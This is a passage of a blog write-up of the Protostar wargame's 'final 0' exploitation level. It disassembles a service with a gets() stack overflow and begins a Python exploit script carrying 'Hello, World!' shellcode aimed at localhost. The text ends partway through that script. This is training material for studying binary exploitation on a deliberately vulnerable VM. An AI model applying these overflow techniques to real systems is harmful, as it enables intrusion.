<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta itemprop="name" content="Exploit Exercises - Protostar - Final levels">
  <title>Exploit Exercises - Protostar - Final levels</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta itemprop="description" content="Exploit Exercises&#39; Protostar wargame includes a number of carefully prepared binary exploitation exercises. This is a write up for the final level exploitation.">

  
  <meta itemprop="keywords" content="exploit exercises, protostar, challenge" />
  
    <meta itemprop="wordCount" content="4481">
  

  <meta property="og:title" content="Exploit Exercises - Protostar - Final levels" />
  <meta property="og:description" content="Exploit Exercises&#39; Protostar wargame includes a number of carefully prepared binary exploitation exercises. This is a write up for the final level exploitation." />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="http://camelinc.info/blog/2014/11/Exploit-Exercises---Protostar---Final-levels/" />
  

  
  <meta property="og:updated_time" content="2014-11-02 16:55:26 &#43;0000 UTC"/>
  
  
  
  

  
    <meta name="twitter:card" content="summary"/>
  

  
  <meta name="twitter:title" content="Exploit Exercises - Protostar - Final levels"/>
  <meta name="twitter:description" content="Exploit Exercises&#39; Protostar wargame includes a number of carefully prepared binary exploitation exercises. This is a write up for the final level exploitation."/>
  
  

  <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
  <link href="http://camelinc.info/css/bootstrap.min.css" rel="stylesheet">
  <link href="http://camelinc.info/css/hc.css" rel="stylesheet">

  
  <link rel="stylesheet" href="http://camelinc.info/css/zenburn.css" type="text/css" media="screen" />

  

  
  <link rel="stylesheet" href="http://camelinc.info/lightbox/css/lightbox.css" type="text/css" media="screen">

  <meta name="generator" content="Hugo 0.16" />
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  
  
</head>


<body>

<div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
  <div id = "wrapper">

<div class="navbar navbar-default" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a href="http://camelinc.info//"><p class="navbar-brand">camelinc</p></a>
        </div>
        <div class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
					
					
					<li><a href="http://camelinc.info/about">About </a></li>
					
					<li><a href="http://camelinc.info/post">Posts </a></li>
					
          </ul>
        </div>
      </div>
    </div>



       
       <div id="sidebar-wrapper">
        <ul class="sidebar-nav">
					<img src="/img/avatar.png" />
          <li class="sidebar-brand"><a href="http://camelinc.info//"><h1 class="brand">camelinc</h1></a><h3></h3></li>
          <hr />

					
						<li><a href="http://camelinc.info/about">About </a></li>
					
						<li><a href="http://camelinc.info/post">Posts </a></li>
					
          <hr />

          <div id="social-wrapper">
           
             <li> <a href="https://twitter.com/camelinc"><i class="fa fa-twitter-square"></i> @twitter</a></li>
           

           
             
           

           
             
           

           
             <li> <a href="https://github.com/camelinc"><i class="fa fa-github-square"></i> github</a> </li>
           
         </div>

       </ul>
     </div>

     <div class="container">


  <div id="article">
    <div class="article-title">Exploit Exercises - Protostar - Final levels</div>
    <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2014-11-02</small></p> <hr/>
    <div class="post">
      

<h1 id="prequisites">Prequisites</h1>

<ul>
<li><a href="http://download.exploit-exercises.com/exploit-exercises-protostar-2.iso">Protostar ISO</a></li>
</ul>

<h1 id="final-0">Final 0</h1>

<p>For this level we have got a binary listening on port 2995.</p>

<h2 id="exploitation">Exploitation</h2>

<p>Let&rsquo;s find out what this binary is up to.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x08049833</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;:</span>    <span class="n">push</span>   <span class="o">%</span><span class="n">ebp</span>
<span class="mh">0x08049834</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;:</span>    <span class="n">mov</span>    <span class="o">%</span><span class="n">esp</span><span class="p">,</span><span class="o">%</span><span class="n">ebp</span>
<span class="mh">0x08049836</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>    <span class="n">and</span>    <span class="err">$</span><span class="mh">0xfffffff0</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x08049839</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>    <span class="n">sub</span>    <span class="err">$</span><span class="mh">0x20</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x0804983c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;:</span>    <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08049844</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;:</span>   <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804984c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;:</span>   <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x8049c74</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>  <span class="p">;</span> <span class="s">&quot;final0&quot;</span>
<span class="mh">0x08049853</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048e58</span> <span class="o">&lt;</span><span class="n">background_process</span><span class="o">&gt;</span>
<span class="mh">0x08049858</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">37</span><span class="o">&gt;:</span>   <span class="n">movl</span>   <span class="err">$</span><span class="mh">0xbb3</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804985f</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x80492f5</span> <span class="o">&lt;</span><span class="n">serve_forever</span><span class="o">&gt;</span>
<span class="mh">0x08049864</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08049868</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">53</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0x18</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x0804986c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">57</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804986f</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x80493d5</span> <span class="o">&lt;</span><span class="n">set_io</span><span class="o">&gt;</span>
<span class="mh">0x08049874</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x804975a</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">&gt;</span>
<span class="mh">0x08049879</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">70</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804987d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">74</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="err">$</span><span class="mh">0x8049c7b</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>    <span class="p">;</span> <span class="s">&quot;No such user %s</span><span class="se">\n</span><span class="s">&quot;</span>
<span class="mh">0x08049882</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">79</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="mh">0x1c</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">),</span><span class="o">%</span><span class="n">edx</span>
<span class="mh">0x08049886</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">83</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">edx</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804988a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">87</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804988d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">90</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048bac</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</code></pre></div>


<p>We have got a service waiting for our commands.
The magic is happening in get_username().</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804975e</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;:</span>    <span class="n">sub</span>    <span class="err">$</span><span class="mh">0x224</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x08049764</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;:</span>   <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x200</span><span class="p">,</span><span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>   <span class="p">;</span> <span class="mi">512</span>
<span class="mh">0x0804976c</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">18</span><span class="o">&gt;:</span>   <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>     <span class="p">;</span> <span class="mi">0</span>
<span class="mh">0x08049774</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;:</span>   <span class="n">lea</span>    <span class="o">-</span><span class="mh">0x210</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>  <span class="p">;</span> <span class="n">var</span> <span class="n">A</span>
<span class="mh">0x0804977a</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804977d</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">35</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048aec</span> <span class="o">&lt;</span><span class="n">memset</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x08049782</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;:</span>   <span class="n">lea</span>    <span class="o">-</span><span class="mh">0x210</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>  <span class="p">;</span>
<span class="mh">0x08049788</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">46</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x0804978b</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048aac</span> <span class="o">&lt;</span><span class="n">gets</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</code></pre></div>


<p>So we have got a 512 byte buffer.
The binary reads in some input and stores it in there.
This is a simple stack based buffer overflow.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x08049790</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">54</span><span class="o">&gt;:</span>   <span class="n">movl</span>   <span class="err">$</span><span class="mh">0xa</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>     <span class="p">;</span> <span class="n">pass</span> <span class="mh">0x0a</span>
<span class="mh">0x08049798</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">62</span><span class="o">&gt;:</span>   <span class="n">lea</span>    <span class="o">-</span><span class="mh">0x210</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>  <span class="p">;</span> <span class="n">pass</span> <span class="n">A</span>
<span class="mh">0x0804979e</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080497a1</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">71</span><span class="o">&gt;:</span>   <span class="n">call</span>   <span class="mh">0x8048a9c</span> <span class="o">&lt;</span><span class="n">strchr</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x080497a6</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
<span class="mh">0x080497a9</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">79</span><span class="o">&gt;:</span>   <span class="n">cmpl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>   <span class="p">;</span> <span class="n">compare</span> <span class="n">against</span> <span class="n">null</span>
<span class="mh">0x080497ad</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">83</span><span class="o">&gt;:</span>   <span class="n">je</span>     <span class="mh">0x80497b5</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">91</span><span class="o">&gt;</span>
<span class="mh">0x080497af</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">85</span><span class="o">&gt;:</span>   <span class="n">mov</span>    <span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080497b2</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">88</span><span class="o">&gt;:</span>   <span class="n">movb</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,(</span><span class="o">%</span><span class="n">eax</span><span class="p">)</span>        <span class="p">;</span> <span class="n">zero</span> <span class="n">out</span>
<span class="p">;...</span>
<span class="mh">0x080497b5</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">91</span><span class="o">&gt;:</span>   <span class="n">movl</span>   <span class="err">$</span><span class="mh">0xd</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>     <span class="p">;</span> <span class="n">pass</span> <span class="mh">0x0d</span>
<span class="mh">0x080497bd</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">99</span><span class="o">&gt;:</span>   <span class="n">lea</span>    <span class="o">-</span><span class="mh">0x210</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>  <span class="p">;</span> <span class="n">pass</span> <span class="n">A</span>
<span class="mh">0x080497c3</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">105</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080497c6</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">108</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048a9c</span> <span class="o">&lt;</span><span class="n">strchr</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x080497cb</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">113</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
<span class="mh">0x080497ce</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">116</span><span class="o">&gt;:</span>  <span class="n">cmpl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>   <span class="p">;</span> <span class="n">compare</span> <span class="n">against</span> <span class="n">null</span>
<span class="mh">0x080497d2</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">120</span><span class="o">&gt;:</span>  <span class="n">je</span>     <span class="mh">0x80497da</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">128</span><span class="o">&gt;</span>
<span class="mh">0x080497d4</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">122</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">-</span><span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080497d7</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">125</span><span class="o">&gt;:</span>  <span class="n">movb</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,(</span><span class="o">%</span><span class="n">eax</span><span class="p">)</span>        <span class="p">;</span> <span class="n">zero</span> <span class="n">out</span>
</code></pre></div>


<p>This part zeroes out the first 0x0a and 0x0d in the strings.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x080497da</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">128</span><span class="o">&gt;:</span>  <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>    <span class="p">;</span> <span class="n">setup</span> <span class="n">loop</span> <span class="n">variable</span>
<span class="mh">0x080497e1</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">135</span><span class="o">&gt;:</span>  <span class="n">jmp</span>    <span class="mh">0x8049807</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">173</span><span class="o">&gt;</span>
<span class="mh">0x080497e3</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">137</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">ebx</span>
<span class="mh">0x080497e6</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">140</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080497e9</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">143</span><span class="o">&gt;:</span>  <span class="n">movzbl</span> <span class="o">-</span><span class="mh">0x210</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080497f1</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">151</span><span class="o">&gt;:</span>  <span class="n">movsbl</span> <span class="o">%</span><span class="n">al</span><span class="p">,</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x080497f4</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">154</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080497f7</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">157</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048adc</span> <span class="o">&lt;</span><span class="n">toupper</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x080497fc</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">162</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">al</span><span class="p">,</span><span class="o">-</span><span class="mh">0x210</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">,</span><span class="o">%</span><span class="n">ebx</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="mh">0x08049803</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">169</span><span class="o">&gt;:</span>  <span class="n">addl</span>   <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">)</span>
<span class="mh">0x08049807</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">173</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">ebx</span>    <span class="p">;</span>
<span class="mh">0x0804980a</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">176</span><span class="o">&gt;:</span>  <span class="n">lea</span>    <span class="o">-</span><span class="mh">0x210</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>  <span class="p">;</span> <span class="n">A</span>
<span class="mh">0x08049810</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">182</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08049813</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">185</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048b8c</span> <span class="o">&lt;</span><span class="n">strlen</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x08049818</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">190</span><span class="o">&gt;:</span>  <span class="n">cmp</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,</span><span class="o">%</span><span class="n">ebx</span>          <span class="p">;</span> <span class="n">end</span> <span class="n">of</span> <span class="n">string</span>
<span class="mh">0x0804981a</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">192</span><span class="o">&gt;:</span>  <span class="n">jb</span>     <span class="mh">0x80497e3</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">137</span><span class="o">&gt;</span>
</code></pre></div>


<p>Next, every character of the string is converted toupper.</p>

<div class="highlight"><pre><code class="language-c-objdump" data-lang="c-objdump"><span class="mh">0x0804981c</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">194</span><span class="o">&gt;:</span>  <span class="n">lea</span>    <span class="o">-</span><span class="mh">0x210</span><span class="p">(</span><span class="o">%</span><span class="n">ebp</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
<span class="mh">0x08049822</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">200</span><span class="o">&gt;:</span>  <span class="n">mov</span>    <span class="o">%</span><span class="n">eax</span><span class="p">,(</span><span class="o">%</span><span class="n">esp</span><span class="p">)</span>        <span class="p">;</span> <span class="n">pass</span> <span class="n">A</span>
<span class="mh">0x08049825</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">203</span><span class="o">&gt;:</span>  <span class="n">call</span>   <span class="mh">0x8048c7c</span> <span class="o">&lt;</span><span class="n">strdup</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="mh">0x0804982a</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">208</span><span class="o">&gt;:</span>  <span class="n">add</span>    <span class="err">$</span><span class="mh">0x224</span><span class="p">,</span><span class="o">%</span><span class="n">esp</span>
<span class="mh">0x08049830</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">214</span><span class="o">&gt;:</span>  <span class="n">pop</span>    <span class="o">%</span><span class="n">ebx</span>
<span class="mh">0x08049831</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">215</span><span class="o">&gt;:</span>  <span class="n">pop</span>    <span class="o">%</span><span class="n">ebp</span>
<span class="mh">0x08049832</span> <span class="o">&lt;</span><span class="n">get_username</span><span class="o">+</span><span class="mi">216</span><span class="o">&gt;:</span>  <span class="n">ret</span>    
</code></pre></div>


<p>And finally, the string is copied to the heap.</p>

<h2 id="exploitation-1">Exploitation</h2>

<p>So we create a pattern to identify the offset for the return address.
We also must keep in mind, to terminate the string with 0x0a or 0x0d.
This is to garantee, that our shellcode does not get mangled in the toupper loop.</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="lineno"> 1 </span><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">socket</span>
<span class="lineno"> 2 </span><span class="kn">import</span> <span class="nn">struct</span>
<span class="lineno"> 3 </span>
<span class="lineno"> 4 </span><span class="n">HOST</span> <span class="o">=</span> <span class="s">&quot;127.0.0.1&quot;</span>
<span class="lineno"> 5 </span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">2995</span>
<span class="lineno"> 6 </span>
<span class="lineno"> 7 </span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="lineno"> 8 </span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
<span class="lineno"> 9 </span>
<span class="lineno">10 </span><span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xe9\x1e\x00\x00\x00</span><span class="s">&quot;</span> <span class="o">+</span><span class="s">&quot;</span><span class="se">\xb8\x04\x00\x00\x00</span><span class="s">&quot;</span> <span class="o">+</span><span class="s">&quot;</span><span class="se">\xbb\x01\x00\x00\x00</span><span class="s">&quot;</span> <span class="o">+</span><span class="s">&quot;</span><span class="se">\x59</span><span class="s">&quot;</span> <span class="o">+</span><span class="s">&quot;</span><span class="se">\xba\x0f\x00\x00\x00</span><span class="s">&quot;</span> <span class="o">+</span><span class="s">&quot;</span><span class="se">\xcd\x80</span><span class="s">&quot;</span> <span class="o">+</span><span class="s">&quot;</span><span class="se">\xb8\x01\x00\x00\x00</span><span class="s">&quot;</span> <span class="o">+</span><span class="s">&quot;</span><span class="se">\xbb\x00\x00\x00\x00</span><span class="s">&quot;</span> <span class="o">+</span><span class="s">&quot;</span><span class="se">\xcd\x80</span><span class="s">&quot;</span> <span class="o">+</span><span class="s">&quot;</span><span class="se">\xe8\xdd\xff\xff\xff</span><span class="s">&quot;</span> <span class="o">+</span><span class="s">&quot;</span><span class="se">\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21</span><span class="s">&quot;</span>
